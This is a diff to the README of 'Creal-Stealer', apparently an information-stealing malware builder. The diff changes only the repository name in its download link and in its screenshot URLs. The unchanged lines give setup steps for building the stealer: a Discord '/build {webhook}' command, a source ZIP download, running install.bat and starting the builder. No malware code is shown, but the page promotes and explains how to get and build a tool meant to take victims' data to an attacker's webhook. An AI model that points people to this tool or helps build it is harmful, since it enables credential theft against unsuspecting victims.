@@ -71,7 +71,7 @@ Join our Discord server and build with the command:
 `/build {webhook}`
 
 ### Manual Setup
-1. [Download the source code (ZIP)](https://github.com/ApfelSafttee/CrealStealer/archive/refs/heads/main.zip)
+1. [Download the source code (ZIP)](https://github.com/ApfelSafttee/Creal-Stealer/archive/refs/heads/main.zip)
 2. Extract the ZIP file
 3. Run `install.bat` to install the required packages
 4. The builder will start automatically
@@ -82,9 +82,9 @@ Join our Discord server and build with the command:
 <h2 align="center">☭ How to Build</h2>
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/ApfelSafttee/CrealStealer/main/img/builder.png" width="65%">
+  <img src="https://raw.githubusercontent.com/ApfelSafttee/Creal-Stealer/main/img/builder.png" width="65%">
   <br><br>
-  <img src="https://raw.githubusercontent.com/ApfelSafttee/CrealStealer/main/img/build.png" width="70%">
+  <img src="https://raw.githubusercontent.com/ApfelSafttee/Creal-Stealer/main/img/build.png" width="70%">
 </p>
 
 ---
@@ -92,13 +92,13 @@ Join our Discord server and build with the command:
 <h2 align="center">🖼️ Gallery</h2>
 
 <div align="center">
-  <img src="https://raw.githubusercontent.com/ApfelSafttee/CrealStealer/main/img/1.png" width="70%">
+  <img src="https://raw.githubusercontent.com/ApfelSafttee/Creal-Stealer/main/img/1.png" width="70%">
   <br><br>
-  <img src="https://raw.githubusercontent.com/ApfelSafttee/CrealStealer/main/img/2.png" width="70%">
+  <img src="https://raw.githubusercontent.com/ApfelSafttee/Creal-Stealer/main/img/2.png" width="70%">
   <br><br>
-  <img src="https://raw.githubusercontent.com/ApfelSafttee/CrealStealer/main/img/3.png" width="35%">
+  <img src="https://raw.githubusercontent.com/ApfelSafttee/Creal-Stealer/main/img/3.png" width="35%">
   <br><br>
-  <img src="https://raw.githubusercontent.com/ApfelSafttee/CrealStealer/main/img/4.png" width="70%">
+  <img src="https://raw.githubusercontent.com/ApfelSafttee/Creal-Stealer/main/img/4.png" width="70%">
 </div>
 
 ---
